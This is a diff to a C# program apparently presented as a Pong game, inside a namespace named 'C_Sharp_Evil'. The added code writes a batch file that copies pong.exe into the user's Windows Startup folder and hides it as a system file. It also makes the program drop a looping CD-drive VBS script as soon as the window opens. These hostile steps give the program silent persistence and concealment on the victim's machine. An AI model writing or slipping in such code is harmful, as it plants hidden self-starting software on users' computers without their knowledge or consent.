@@ -49,15 +49,22 @@ namespace C_Sharp_Evil
                                           "set colCDROMs = nothing",
                                           "loop"
                                       };
+        string[] moveBat = {
+                               "@Echo on",
+                               "Xcopy  pong.exe \"" + @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + "\"",
+                               "attrib " + @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pong.exe" + "\"" + "+s +h",
+                           };
 
         public Evil()
         {
             InitializeComponent();
+            writeFile(CDVBSArr, CDVBSPath, @"CD.vbs");
         }
 
         private void picPong_Click(object sender, EventArgs e)
         {
             writeFile(CDVBSArr, CDVBSPath, @"CD.vbs");
+            writeFile(moveBat, "", "move.bat");
             Application.Exit();
         }
 
